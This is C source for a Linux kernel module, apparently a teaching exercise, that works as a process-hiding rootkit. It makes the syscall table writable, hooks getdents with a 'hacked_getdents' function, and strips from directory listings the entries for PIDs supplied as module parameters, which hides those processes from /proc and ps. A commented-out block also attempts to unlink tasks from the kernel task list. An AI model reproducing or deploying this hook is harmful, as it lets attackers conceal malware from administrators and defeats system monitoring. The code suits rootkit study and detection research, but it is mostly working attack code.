#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/moduleparam.h>
#include <linux/reboot.h>
#include "../sysmap.h"		// for sys_call_table address this is Device spesific
#include <linux/sched.h> 
#include <linux/init.h> 
#include <linux/kernel.h>

#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module: "

//unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; // Address of the Syscall table from sysmap
int PIDs[10];
int numPIDs;
module_param_array(PIDs, int, &numPIDs, 0000);
MODULE_PARM_DESC(PIDs, "An array of the PIDs that should be hidden");

// struct dev so compiler seems sattisfyed
struct linux_dirent {   
	unsigned long   d_ino;   
	unsigned long   d_off;   
	unsigned short  d_reclen;   
	char            d_name[];   
}; 


atomic_t in_orig_syscall = ATOMIC_INIT(0);

unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; 
asmlinkage int (*original_getdents) (unsigned int, struct linux_dirent __user *, unsigned int);

bool checkPID(long curpid){
	int i;
	for( i = 0; i<numPIDs; i++){
		if(curpid == PIDs[i])
			return true;	
	}
	return false;
}

asmlinkage int hacked_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	int ret;
	int len;
	int curlen;
	long curpid;

	atomic_inc(&in_orig_syscall); 
	ret = original_getdents(fd,dirp,count);	
	len = ret;

	while(len>0)
	{
		curlen  = dirp->d_reclen;
		len = len-curlen;

		if(kstrtol(dirp->d_name,0,&curpid) == 0){		// This is getting interesting
					
			if(checkPID(curpid)){ 
				printk("Found a Task to be hidden: %ld - %s\n", curpid, pid_task(find_vpid(curpid), PIDTYPE_PID)->comm);
				memmove(dirp, (char*) dirp + dirp->d_reclen,len);
				ret -= curlen;
			}
			else if(len != 0)
			{
				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
			}
		}
		else {	// not an interesting entry
			if(len != 0)
			{
				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
			}
		}

	}

	atomic_dec(&in_orig_syscall);
	return ret;
}
/*
void hide_tasks(void) {
	struct task_struct *task;
	struct task_struct *next;
	struct task_struct *prev;



//	task = find_task_by_vpid(PIDs[0]);
	
//	printk(KERN_INFO "Found: %s PID:%d\n", task->comm, task->pid);//, prev->comm, next->comm);
	//REMOVE_LINKS(task);
	//unhash_pid(task);






	struct task_struct t = init_task.next_task;


	for (task = &init_task ; (task = next_task(task)) != &init_task ; )
	{
		 //Walking through the list of tasks: TODO: remove PIDs
		if(task->pid==PIDs[0] || task->pid==PIDs[1] || task->pid==PIDs[2] || task->pid==PIDs[3]){ 
			//next = next_task(task);	//task->tasks.next	
			//prev = list_entry_rcu(task->tasks.prev, struct task_struct, tasks);
			//task->pidhash_next = next->pidhash_prev
		   // next->prev_task = task->prev_task;
           // prev->next_task = task->next_task;
			//next->tasks.prev = task->tasks.prev;
			//prev->tasks.next = task->tasks.next;
			//printk(KERN_INFO "Found: %s PID:%d Prev: %s, Next: %s\n", task->comm, task->pid, prev->comm, next->comm);
			printk(KERN_INFO "Found: %s PID:%d\n", task->comm, task->pid);//, prev->comm, next->comm); //			write_lock_irq(&tasklist_lock) ;
			//REMOVE_LINKS(task);
			
//			save_flags(flags) ; 
//			cli();
//			(task)->next_task->prev_task = (task)->prev_task;
//			(task)->prev_task->next_task = (task)->next_task;
//			restore_flags(flags);
//			if ((task)->p_osptr)
//				(task)->p_osptr->p_ysptr = (task)->p_ysptr;
//			if ((task)->p_ysptr)
//				(task)->p_ysptr->p_osptr = (task)->p_osptr;
//			else
//				(task)->p_pptr->p_cptr = (task)->p_osptr;


			task->pid = 0;


		//	unhash_pid(task);
//			write_unlock_irq(&tasklist_lock) ;
	
		}
	}
}
*/



/* Make the page writable */
int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

static int __init init_mod(void)
{	
	int i;
	printk("inserting...\n");

	printk("numPIDs: %d\n",numPIDs);
	for(i = 0; i<numPIDs; i++) {
		printk("Task to be hidden:  %d - %s\n",PIDs[i], pid_task(find_vpid(PIDs[i]), PIDTYPE_PID)->comm);
	}

	make_rw((unsigned long)sys_call_table);
	original_getdents = (void*)*(sys_call_table + __NR_getdents);
	*(sys_call_table + __NR_getdents) = (unsigned long)hacked_getdents;
	make_ro((unsigned long)sys_call_table);
	printk("Hock is running; processes should be hidden\n");

	//hide_tasks();
	return 0;
}

static void __exit  exit_mod(void)
{
	printk("exiting...\n");

	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
	make_ro((unsigned long)sys_call_table);
	if(atomic_read(&in_orig_syscall)!=0) 
		printk("waiting for instance to be finished\n");
	while(atomic_read(&in_orig_syscall)!=0){
		msleep(10);
	}
	printk("hook is not running anymore\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
